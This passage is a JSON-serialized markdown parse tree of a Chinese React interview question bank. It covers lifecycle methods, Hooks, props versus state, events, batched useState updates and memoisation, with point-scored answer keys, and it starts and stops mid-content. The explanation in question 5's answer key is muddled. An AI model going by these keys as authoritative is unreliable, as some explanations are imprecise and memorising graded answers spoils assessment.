&#39;redux-thunk&#39;;\\n\\nconst initialState = { data: null };\\n\\nconst reducer = (state = initialState, action) =&gt; {\\n  switch (action.type) {\\n    case &#39;FETCH_DATA_SUCCESS&#39;:\\n      return { ...state, data: action.payload };\\n    default:\\n      return state;\\n  }\\n};\\n\\nconst fetchData = () =&gt; async (dispatch) =&gt; {\\n  const response = await fetch(&#39;/api/data&#39;);\\n  const data = await response.json();\\n  dispatch({ type: &#39;FETCH_DATA_SUCCESS&#39;, payload: data });\\n};\\n\\nconst store = createStore(reducer, applyMiddleware(thunk));\\n\\nstore.dispatch(fetchData());\\n</code></pre>\\n","ast":[{"type":"heading","raw":"# react\\n\\n","depth":1,"text":"react","tokens":[{"type":"text","raw":"react","text":"react","escaped":false}]},{"type":"heading","raw":"## 1. 什么是 React 的生命周期方法？\\n\\n","depth":2,"text":"1. 什么是 React 的生命周期方法？","tokens":[{"type":"text","raw":"1. 什么是 React 的生命周期方法？","text":"1. 什么是 React 的生命周期方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W1\\n\\n","depth":4,"text":"级别：W1","tokens":[{"type":"text","raw":"级别：W1","text":"级别：W1","escaped":false}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 类组件声明周期方法:\\n- **1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。\\n- **1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。\\n- **1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。\\n- **1：** 函数组件生命周期（Hooks）:\\n- **1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 类组件声明周期方法:\\n","task":false,"loose":false,"text":"**1：** 类组件声明周期方法:","tokens":[{"type":"text","raw":"**1：** 类组件声明周期方法:","text":"**1：** 类组件声明周期方法:","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 类组件声明周期方法:","text":" 类组件声明周期方法:","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。\\n","task":false,"loose":false,"text":"**1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","tokens":[{"type":"text","raw":"**1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","text":"**1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","text":" 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。\\n","task":false,"loose":false,"text":"**1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","tokens":[{"type":"text","raw":"**1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","text":"**1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","text":" 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。\\n","task":false,"loose":false,"text":"**1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","tokens":[{"type":"text","raw":"**1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","text":"**1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","text":" 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 函数组件生命周期（Hooks）:\\n","task":false,"loose":false,"text":"**1：** 函数组件生命周期（Hooks）:","tokens":[{"type":"text","raw":"**1：** 函数组件生命周期（Hooks）:","text":"**1：** 函数组件生命周期（Hooks）:","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 函数组件生命周期（Hooks）:","text":" 函数组件生命周期（Hooks）:","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","task":false,"loose":false,"text":"**1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","tokens":[{"type":"text","raw":"**1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","text":"**1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","text":" useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nuseEffect(() => {\\n// 组件挂载时执行的操作\\nreturn () => {\\n// 组件卸载时清理资源\\n};\\n}, [dependencies]);  // 依赖数组\\n\\n```","lang":"js","text":"\\nuseEffect(() => {\\n// 组件挂载时执行的操作\\nreturn () => {\\n// 组件卸载时清理资源\\n};\\n}, [dependencies]);  // 依赖数组\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. React 中的 Hook 是什么？\\n\\n","depth":2,"text":"2. React 中的 Hook 是什么？","tokens":[{"type":"text","raw":"2. React 中的 Hook 是什么？","text":"2. React 中的 Hook 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W1\\n\\n","depth":4,"text":"级别：W1","tokens":[{"type":"text","raw":"级别：W1","text":"级别：W1","escaped":false}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** useState()：用于在函数组件中添加状态。\\n- **1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。\\n- **1：** useContext()：用于在函数组件中访问上下文（Context）。\\n- **1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。\\n- **1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。\\n- **1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** useState()：用于在函数组件中添加状态。\\n","task":false,"loose":false,"text":"**1：** useState()：用于在函数组件中添加状态。","tokens":[{"type":"text","raw":"**1：** useState()：用于在函数组件中添加状态。","text":"**1：** useState()：用于在函数组件中添加状态。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useState()：用于在函数组件中添加状态。","text":" useState()：用于在函数组件中添加状态。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。\\n","task":false,"loose":false,"text":"**1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","tokens":[{"type":"text","raw":"**1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","text":"**1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","text":" useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useContext()：用于在函数组件中访问上下文（Context）。\\n","task":false,"loose":false,"text":"**1：** useContext()：用于在函数组件中访问上下文（Context）。","tokens":[{"type":"text","raw":"**1：** useContext()：用于在函数组件中访问上下文（Context）。","text":"**1：** useContext()：用于在函数组件中访问上下文（Context）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useContext()：用于在函数组件中访问上下文（Context）。","text":" useContext()：用于在函数组件中访问上下文（Context）。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。\\n","task":false,"loose":false,"text":"**1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","tokens":[{"type":"text","raw":"**1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","text":"**1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","text":" useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。\\n","task":false,"loose":false,"text":"**1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。","tokens":[{"type":"text","raw":"**1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。","text":"**1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useRef()：用于访问组件中的 DOM 节点或保存可变的值。","text":" useRef()：用于访问组件中的 DOM 节点或保存可变的值。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","task":false,"loose":false,"text":"**1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","tokens":[{"type":"text","raw":"**1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","text":"**1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","text":" useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. React 中的状态和 props 有什么区别？\\n\\n","depth":2,"text":"3. React 中的状态和 props 有什么区别？","tokens":[{"type":"text","raw":"3. React 中的状态和 props 有什么区别？","text":"3. React 中的状态和 props 有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W2\\n\\n","depth":4,"text":"级别：W2","tokens":[{"type":"text","raw":"级别：W2","text":"级别：W2","escaped":false}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","task":false,"loose":false,"text":"**1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","tokens":[{"type":"text","raw":"**1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","text":"**1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","text":" props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n function MyComponent(props) {\\n  return <h1>{props.message}</h1>;\\n}\\n\\n```","lang":"js","text":" function MyComponent(props) {\\n  return <h1>{props.message}</h1>;\\n}\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","task":false,"loose":false,"text":"**1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","tokens":[{"type":"text","raw":"**1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","text":"**1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","text":" state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction MyComponent() {\\n  const [count, setCount] = useState(0);\\n  return <button onClick={() => setCount(count + 1)}>{count}</button>;\\n}\\n\\n```","lang":"js","text":"function MyComponent() {\\n  const [count, setCount] = useState(0);\\n  return <button onClick={() => setCount(count + 1)}>{count}</button>;\\n}\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. React 中如何处理事件？\\n\\n","depth":2,"text":"4. React 中如何处理事件？","tokens":[{"type":"text","raw":"4. React 中如何处理事件？","text":"4. React 中如何处理事件？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W2\\n\\n","depth":4,"text":"级别：W2","tokens":[{"type":"text","raw":"级别：W2","text":"级别：W2","escaped":false}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","task":false,"loose":false,"text":"**1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","tokens":[{"type":"text","raw":"**1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","text":"**1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","text":" React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction MyComponent() {\\n  const handleClick = (event) => {\\n    alert(\'Button clicked!\');\\n  };\\n\\n  return <button onClick={handleClick}>Click Me</button>;\\n}\\n\\n```","lang":"js","text":"function MyComponent() {\\n  const handleClick = (event) => {\\n    alert(\'Button clicked!\');\\n  };\\n\\n  return <button onClick={handleClick}>Click Me</button>;\\n}\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** React 会自动绑定事件处理函数。\\n- **1：** 事件对象会被 React 规范化。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** React 会自动绑定事件处理函数。\\n","task":false,"loose":false,"text":"**1：** React 会自动绑定事件处理函数。","tokens":[{"type":"text","raw":"**1：** React 会自动绑定事件处理函数。","text":"**1：** React 会自动绑定事件处理函数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" React 会自动绑定事件处理函数。","text":" React 会自动绑定事件处理函数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 事件对象会被 React 规范化。","task":false,"loose":false,"text":"**1：** 事件对象会被 React 规范化。","tokens":[{"type":"text","raw":"**1：** 事件对象会被 React 规范化。","text":"**1：** 事件对象会被 React 规范化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件对象会被 React 规范化。","text":" 事件对象会被 React 规范化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. useState 连续调用，页面不更新？\\n\\n","depth":2,"text":"5. useState 连续调用，页面不更新？","tokens":[{"type":"text","raw":"5. useState 连续调用，页面不更新？","text":"5. useState 连续调用，页面不更新？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"code","raw":"```js\\nconst [age,  setAge] = useState(42);\\n\\nfunction handleClick() {\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n}\\n\\n// 点击一次后，age 将只会变为 43 而不是 45！\\n```","lang":"js","text":"const [age,  setAge] = useState(42);\\n\\nfunction handleClick() {\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n}\\n\\n// 点击一次后，age 将只会变为 43 而不是 45！"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。\\n- **1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。\\n","task":false,"loose":false,"text":"**1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","tokens":[{"type":"text","raw":"**1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","text":"**1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","text":" 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","task":false,"loose":false,"text":"**1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","tokens":[{"type":"text","raw":"**1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","text":"**1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","text":" 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction handleClick() {\\n  setAge(a => a + 1); // setAge(42 => 43)\\n  setAge(a => a + 1); // setAge(43 => 44)\\n  setAge(a => a + 1); // setAge(44 => 45)\\n}\\n```","lang":"js","text":"function handleClick() {\\n  setAge(a => a + 1); // setAge(42 => 43)\\n  setAge(a => a + 1); // setAge(43 => 44)\\n  setAge(a => a + 1); // setAge(44 => 45)\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. React中的性能优化方法有哪些？\\n\\n","depth":2,"text":"6. React中的性能优化方法有哪些？","tokens":[{"type":"text","raw":"6. React中的性能优化方法有哪些？","text":"6. React中的性能优化方法有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用React.memo进行组件缓存：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用React.memo进行组件缓存：","task":false,"loose":false,"text":"**1：** 使用React.memo进行组件缓存：","tokens":[{"type":"text","raw":"**1：** 使用React.memo进行组件缓存：","text":"**1：** 使用React.memo进行组件缓存：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用React.memo进行组件缓存：","text":" 使用React.memo进行组件缓存：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst MyComponent = React.memo(function MyComponent(props) {\\n  /* 组件逻辑 */\\n});\\n```","lang":"jsx","text":"const MyComponent = React.memo(function MyComponent(props) {\\n  /* 组件逻辑 */\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用useMemo缓存计算结果：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用useMemo缓存计算结果：","task":false,"loose":false,"text":"**1：** 使用useMemo缓存计算结果：","tokens":[{"type":"text","raw":"**1：** 使用useMemo缓存计算结果：","text":"**1：** 使用useMemo缓存计算结果：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用useMemo缓存计算结果：","text":" 使用useMemo缓存计算结果：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);\\n```","lang":"jsx","text":"const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用useCallback缓存函数：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用useCallback缓存函数：","task":false,"loose":false,"text":"**1：** 使用useCallback缓存函数：","tokens":[{"type":"text","raw":"**1：** 使用useCallback缓存函数：","text":"**1：** 使用useCallback缓存函数：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用useCallback缓存函数：","text":" 使用useCallback缓存函数：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst memoizedCallback = useCallback(\\n  () => {\\n    doSomething(a, b);\\n  },\\n  [a, b],\\n);\\n```","lang":"jsx","text":"const memoizedCallback = useCallback(\\n  () => {\\n    doSomething(a, b);\\n  },\\n  [a, b],\\n);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 合理使用key：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 合理使用key：","task":false,"loose":false,"text":"**1：** 合理使用key：","tokens":[{"type":"text","raw":"**1：** 合理使用key：","text":"**1：** 合理使用key：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用key：","text":" 合理使用key：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\n{list.map(item => (\\n  <ListItem \\n    key={item.id} // 使用唯一且稳定的key\\n    data={item}\\n  />\\n))}\\n```","lang":"jsx","text":"{list.map(item => (\\n  <ListItem \\n    key={item.id} // 使用唯一且稳定的key\\n    data={item}\\n  />\\n))}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 避免不必要的渲染：\\n  + 使用React.lazy进行代码分割\\n  + 使用虚拟列表处理长列表\\n  + 